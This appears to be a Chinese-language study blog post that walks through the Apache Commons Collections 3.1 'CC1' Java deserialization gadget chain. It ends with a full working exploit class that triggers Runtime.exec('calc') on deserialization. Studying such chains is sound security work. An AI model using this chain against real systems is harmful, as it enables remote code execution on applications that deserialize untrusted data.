---
title: CommonCollections1
date: 2023-04-04 15:10:57
tags: Java
cover: https://raw.githubusercontent.com/todis21/image/main/202304051554165.png
---

# CommonCollections1



## 前言

Commons Collections是反序列化漏洞学习过程中不可缺少的一部分，Apache Commons Collections是Java中应用广泛的一个库，包括Weblogic、JBoss、WebSphere、Jenkins等知名大型Java应用都使用了这个库。

Apache Commons Collections 中提供了一个 Transformer 的类，这个接口的功能就是将一个对象转换为另外一个对象，CC 链都依赖于此



下面的是跟着大佬的脚步，一步一步分析，从零开始一层一层往上找链子

## 环境搭建



然后下载sun包，点击zip

https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4

下载后解压，把 jdk-af660750b2f4/src/share/classes/sun 放到jdk中src⽂件夹中，默认有个src.zip 需要先

解压

![image-20230405101946093](https://raw.githubusercontent.com/todis21/image/main/202304051554777.png)

把src⽂件加载进来

![image-20230405102033235](https://raw.githubusercontent.com/todis21/image/main/202304051554932.png)

创建一个Maven项目，不用选择任何Maven模板；
在pom.xml中添加如下代码：

```xml
<dependencies>
        <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.1</version>
        </dependency>
    </dependencies>
```



pom.xml:

```xml
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
  <modelVersion>4.0.0</modelVersion>

  <groupId>org.example</groupId>
  <artifactId>CC1</artifactId>
  <version>1.0-SNAPSHOT</version>
  <packaging>jar</packaging>

  <name>CC1</name>
  <url>http://maven.apache.org</url>

  <properties>
    <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
  </properties>

  <dependencies>
    <dependency>
      <groupId>commons-collections</groupId>
      <artifactId>commons-collections</artifactId>
      <version>3.1</version>
    </dependency>
  </dependencies>
</project>
```



## 找链子

找这条链子的最终目的是为了执行任意命令，比如说弹个计算器`calc`



最简单的方法是

```java
Runtime.getRuntime().exec("calc");
```



通过反射方式实现：

```java
Runtime r = Runtime.getRuntime();
Class c =Runtime.class;
Method execMethod  = c.getMethod("exec",String.class);
execMethod.invoke(r,"calc");
```



这里，我们不能够简单的实现这样的功能，而是找到一条链子，通过一层层的调用来执行命令



首先，要找到漏洞点

在`Apache Commons Collections`库中，里面有一个Transformer.java ,里面就这点东西

![image-20230404173415777](https://raw.githubusercontent.com/todis21/image/main/202304051554657.png)

这段代码定义了一个接口叫做 Transformer，它是一种用于类型转换或者提取数据的函数接口。该接口中只有一个单独的方法 transform(Object input) ，用于将输入对象转换成输出对象，而不改变输入对象本身。



查看一下实现Transformer的方法，总共有14个，漏洞点在`InvokerTransformer`里

![image-20230404174817485](https://raw.githubusercontent.com/todis21/image/main/202304051555827.png)

跟进InvokerTransformer.java里，查看它的transform方法：

```java
public Object transform(Object input) {
        if (input == null) {
            return null;
        }
        try {
            Class cls = input.getClass();
            Method method = cls.getMethod(iMethodName, iParamTypes);
            return method.invoke(input, iArgs);
                
        } catch (NoSuchMethodException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' does not exist");
        } catch (IllegalAccessException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
        } catch (InvocationTargetException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' threw an exception", ex);
        }
    }
```

首先，该方法会判断输入对象是否为空，如果为空则直接返回 null。

如果输入对象不为空，则会获取其所属的类，并根据传入的方法名以及参数类型，反射获取该方法的 Method 对象。接下来，通过 method.invoke() 方法，对原输入对象调用该方法并传入参数，得到转换后的结果对象，并将其返回。

在这里我们可以看到刚刚反射执行`calc`的影子，并且`iMethodName (方法名)`，`iParamTypes (参数类型) `，`iArgs (参数)`都是可控的，可以实现任意方法调用

往上寻找它的构造函数：

```java
public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
        super();
        iMethodName = methodName;
        iParamTypes = paramTypes;
        iArgs = args;
    }
```



可以尝试用这个方法弹个计算器

```java
 Runtime r = Runtime.getRuntime();
 new InvokerTransformer("exec", new Class[]{String.class}, new Object[] {"calc.exe"}).transform(r);
```

成功执行！

<img src="https://raw.githubusercontent.com/todis21/image/main/202304051555629.png" alt="image-20230404190713998" style="zoom:50%;" />



现在相当于获取了链子的末端[危险方法：transform]，看看有哪些类调用了transform，这样我们才能往上走，Alt+F7

可以看到有19个调用，经过一番查找，找到TransformedMap

![image-20230404192653822](https://raw.githubusercontent.com/todis21/image/main/202304051555610.png)



```java
protected Object checkSetValue(Object value) {
     return valueTransformer.transform(value);
 }
```

`valueTransformer`是构造函数传来的，`value`还不能确定能不能控制

查看`TransformedMap`的构造函数：

```java
protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {
   super(map);
   this.keyTransformer = keyTransformer;
   this.valueTransformer = valueTransformer;
}
```

该方法继承自 Map 接口的实现类，用于对 Map 中的 key 和 value 进行转换操作。其中，构造方法接收一个 Map 对象 map，以及两个 Transformer 对象 keyTransformer 和 valueTransformer，分别用于对 Map 中的 key 和 value 进行转换



因为这个构造函数是`protected`类型的，只能在类内部和子类中访问，看看哪个方法调用了它

直接往上一个方法就看到了,这里直接完成了上一个函数的操作，并且是`public static`

```java
public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
      return new TransformedMap(map, keyTransformer, valueTransformer);
 }
```

到这里，我们是可以直接调用`decorate`方法，但是还没找到让程序执行到`checkSetValue` 的方式

查看一下有哪些方法调用了`checkSetValue`,直接Alt+F7

![image-20230404200924860](https://raw.githubusercontent.com/todis21/image/main/202304051555228.png)

找到了，并且只有一个，在`AbstractInputCheckedMapDecorator.java`中,如下

```java
static class MapEntry extends AbstractMapEntryDecorator {

        /** The parent map */
        private final AbstractInputCheckedMapDecorator parent;

        protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) {
            super(entry);
            this.parent = parent;
        }

        public Object setValue(Object value) {
            value = parent.checkSetValue(value);
            return entry.setValue(value);
        }
    }
```

并且发现`AbstractInputCheckedMapDecorator`是TransformedMap的父类

![image-20230404201443638](https://raw.githubusercontent.com/todis21/image/main/202304051555347.png)



再看看有哪些地方调用了`setValue`方法，Alt+F7，发现有好多

经过大佬讲解，这个`MapEntry`名字已经给出了提示，大概就是遍历map的键值对时就会调用这个方法，这里的setValue()其实是被重写了的entry.setValue()

```java
for(Map.Entry entry:Map.entrySet()) //遍历map
{
    entry.getValue();
}   
```



到这里应该通透了，可以试试用这个来弹计算器

```java
InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[] {"calc.exe"});
HashMap<Object,Object> map = new HashMap<Object, Object>();
map.put("key","value");
Map<Object,Object> transformedMap  = TransformedMap.decorate(map,null,invokerTransformer);
for(Map.Entry entry:transformedMap.entrySet())
  {
    entry.setValue(r);
  }
```

OK,没猫病

![image-20230404203335268](https://raw.githubusercontent.com/todis21/image/main/202304051555088.png)











到现在已经找到后半条链了，现在要找到一个遍历Map的地方，并且使用了setValue()，就可以执行后面的链子了



继续找调用了setValue()的不同类，最好找到满足条件并且在readObject方法下的， 通过Alt+F7直接找到setValue()

![image-20230405102345558](https://raw.githubusercontent.com/todis21/image/main/202304051555770.png)



在sun.reflect.annotation下发现了readObject⽅法，点进去查看，发现刚好满足条件，遍历集合，重写了readObject(),并且调用了setValue(),

![image-20230405102543904](https://raw.githubusercontent.com/todis21/image/main/202304051555873.png)



查看一下这个类的构造函数

构造⽅法传⼊两个参数，第⼀个是注解，第⼆个是map集合这个我们可以控制

![image-20230405103639780](https://raw.githubusercontent.com/todis21/image/main/202304051555799.png)

该类使⽤了class修饰 所以访问需要当前包下，这⾥需要使⽤反射加载才能调⽤这个构造⽅法

目前流程大概是这样子的：

```java
Runtime r = Runtime.getRuntime();
InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[] {"calc.exe"});
HashMap<Object,Object> map = new HashMap<Object, Object>();
map.put("key","value");
Map<Object,Object> transformedMap  = TransformedMap.decorate(map,null,invokerTransformer);

Class c= Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor annotationInvocationHandlConstructor = c.getDeclaredConstructor(Class.class,Map.class);
annotationInvocationHandlConstructor.setAccessible(true);
serialize(o);
unserialize("ser.bin");
```

serialize和unserialize如下：

```java
public static void serialize(Object obj) throws IOException{
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
```



⼤致是这样的，但是⽆法运⾏，因为序列化必须继承Serializable接⼝，Runtime ⽆法序列化，并且setValue的值⽆法控制

还有就是遍历map中需要绕过两个if判断

问题多多，需要一个个解决



先解决Runtime问题

虽然Runtime⽆法序列化，但是`Runtime.class`是可以序列化的

```java
Class c = Runtime.class;
Method getRuntime = c.getMethod("getRuntime", null);
Runtime r = (Runtime) getRuntime.invoke(null, null);
Method exec = c.getMethod("exec", String.class);
exec.invoke(r,"calc");

```

```java
//将上面的代码转换一下


Method getRuntimeMethod = (Method) new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime",null}).transform(Runtime.class);

Runtime r = (Runtime) new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}).transform(getRuntimeMethod);

new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}).transform(r);
```

这里可以发现，前一段的代码的输出，是后一段代码的输入，递归调用

有一个方法可以实现它

![image-20230405112001531](https://raw.githubusercontent.com/todis21/image/main/202304051556062.png)

只要传入要调用的方法的数组就行

```java
Transformer[] transformers = new Transformer[]{
   new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class}, new Object[]{"getRuntime", null}),
   new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class}, new Object[]{null, null}),
   new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
chainedTransformer.transform(Runtime.class);
```

正常执行

![image-20230405112757891](https://raw.githubusercontent.com/todis21/image/main/202304051556399.png)



这里修改过后，后面的也需要更改

```java
Transformer[] transformers = new Transformer[]{
     new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class}, new Object[]{"getRuntime", null}),
     new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class}, new Object[]{null, null}),
     new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
//chainedTransformer.transform(Runtime.class);


//InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[] {"calc.exe"});
HashMap<Object,Object> map = new HashMap<Object, Object>();
map.put("key","value");
Map<Object,Object> transformedMap  = TransformedMap.decorate(map,null,chainedTransformer);

Class c= Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor annotationInvocationHandlConstructor = c.getDeclaredConstructor(Class.class,Map.class);
annotationInvocationHandlConstructor.setAccessible(true);
Object o = annotationInvocationHandlConstructor.newInstance(Override.class,transformedMap);
serialize(o);
unserialize("ser.bin");
```



现在还不能正常运行，还需要解决两个判断条件：

经过调试，发现已经进入两个判断了

！这咋和教程里的不一样，大佬调试的还没进判断里，我的就进去了



![image-20230405115955396](https://raw.githubusercontent.com/todis21/image/main/202304051556765.png)



可能是我的jdk版本问题，我的是jdk 8u361，建议用下面的

环境jdk 8u65

https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html





用大佬的图，继续

在上面的代码可以看出两个if 分别是检测key中的value是否为空，第⼆个if是判断参数是否强转

这⾥打个断点调试下

看到这⾥的memberType是传⼊的注解 Override，成员变量为空

![image-20230405151509078](https://raw.githubusercontent.com/todis21/image/main/202304051556123.png)

这⾥的memberValue是map中的Override，通过这个Override寻找这个value，下⼀步后，直接跳出判断，

![image-20230405151707774](https://raw.githubusercontent.com/todis21/image/main/202304051556077.png)

Override是单独的接⼝，没有成员⽅法

![image-20230405151819169](https://raw.githubusercontent.com/todis21/image/main/202304051556475.png)

这⾥换成其他注解 Target

![image-20230405151852079](https://raw.githubusercontent.com/todis21/image/main/202304051556370.png)



```java
修改前：Object o = annotationInvocationHandlConstructor.newInstance(Override.class,transformedMap);
修改后：Object o = annotationInvocationHandlConstructor.newInstance(Target.class,transformedMap);
```



替换后重新断点,发现找到了参数

![image-20230405152131419](https://raw.githubusercontent.com/todis21/image/main/202304051556732.png)

这⾥第⼆个if也成功绕过

![image-20230405153735429](https://raw.githubusercontent.com/todis21/image/main/202304051556195.png)

还有一个问题，就是参数控制setValue的参数控制

点击setValue 进来，跳转到transformmap中的checkSetValue⽅法，value为固定的，⽆法控制执⾏任意类

![image-20230405154030512](https://raw.githubusercontent.com/todis21/image/main/202304051556466.png)

在⼀开始查找transform时，会有⼀个ClosureTransformer类，这⾥的transform传递的参数不论是什么，都会返回⼀个常量，因此通过这个进⾏覆盖。

原本调⽤valueTransformer.transform(Object)，中途在换 ClosureTransformer.transform(Object) 只要最终调⽤到transform(Object)就可以执⾏任意类

![image-20230405154346613](https://raw.githubusercontent.com/todis21/image/main/202304051556411.png)

在数组中添加⼀下代码，把value替换为Runtime.class即可执⾏命令

```
new ConstantTransformer(Runtime.class)
```

## 结束

这就是最终的调⽤链,在最终调⽤transform的时候，⽤的是不同类的同名函数

![image-20230405154532332](https://raw.githubusercontent.com/todis21/image/main/202304051557054.png)



exp:

```java
package org.example;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

public class demo {
    public static void main(String[] args) throws Exception {
        //代码执行
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class,
                        Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class,
                        Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]
                        {"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
		//遍历map
        HashMap<Object,Object> map = new HashMap();
        map.put("value","aaa");
        Map<Object,Object> transformedMap  = TransformedMap.decorate(map,null,chainedTransformer);
		
        
        //反射调用
        Class c= Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");

        Constructor annotationInvocationHandlConstructor = c.getDeclaredConstructor(Class.class,Map.class);
        annotationInvocationHandlConstructor.setAccessible(true);
        Object o = annotationInvocationHandlConstructor.newInstance(Target.class,transformedMap);
        //序列化与反序列化
        serialize(o);
        unserialize("ser2.bin");

    }
    public static void serialize(Object obj) throws IOException{
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser2.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }

}

```

